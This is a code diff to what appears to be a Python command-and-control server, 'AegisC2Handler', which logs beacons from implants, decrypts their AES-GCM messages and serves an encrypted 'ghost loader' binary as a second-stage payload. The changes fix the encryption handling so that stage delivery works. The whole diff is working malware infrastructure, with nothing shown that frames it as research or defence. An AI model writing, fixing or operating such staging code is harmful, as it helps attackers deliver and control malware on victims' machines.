@@ -304,12 +304,10 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
             log_print(f"[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes)", Colors.WARNING)
             # Basic IP tracking fallback omitted for brevity in daemon mode
 
+        # We must decrypt the beacon to mathematically progress the server's AES-GCM sequence!
+        # The client used the envelope WITH ZERO IV AND TAG as AAD.
         if env and ct:
-            # We must decrypt the beacon to mathematically progress the server's AES-GCM sequence!
-            # The client used the envelope WITH ZERO IV AND TAG as AAD.
             aad_env = bytearray(data[:ENVELOPE_SIZE])
-
-            # offsets: iv is bytes 16 to 28, tag is bytes 28 to 44
             aad_env[16:28] = b'\x00' * 12 # iv
             aad_env[28:44] = b'\x00' * 16 # tag
 
@@ -364,6 +362,16 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
 
         log_print(f"[⬇] Stage request from {short_id} ({client_ip})", Colors.BLUE)
 
+        # Decrypt the incoming request to mathematically progress the server's AES-GCM sequence
+        if env and ct:
+            aad_env = bytearray(data[:ENVELOPE_SIZE])
+            aad_env[16:28] = b'\x00' * 12  # zero IV for AAD
+            aad_env[28:44] = b'\x00' * 16  # zero tag for AAD
+            try:
+                SERVER_CRYPTO.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+            except Exception as e:
+                log_print(f"  └─ Failed to decrypt stage request: {e}", Colors.FAIL)
+
         # Look for the ghost loader binary in known locations
         ghost_paths = [
             os.path.join(PROJECT_ROOT, "build", "aegis_ghost_loader"),
@@ -383,7 +391,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 # We must construct the AAD envelope *before* encryption.
                 # In the C client `aegis_encrypt` is called with the envelope as AAD,
                 # but the `iv` and `tag` fields within that envelope are 0 at the time of the call!
-                aad_env = struct.pack(
+                aad_env_out = struct.pack(
                     ENVELOPE_FMT,
                     C2_MAGIC,
                     C2_MSG_STAGE_DATA,
@@ -395,7 +403,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 )
 
                 # Encrypt the stage for the client using the correct AAD!
-                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data, aad_env)
+                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data, aad_env_out)
 
                 # Now pack the FINAL envelope with the actual IV and TAG to send over the wire
                 env_bytes = struct.pack(
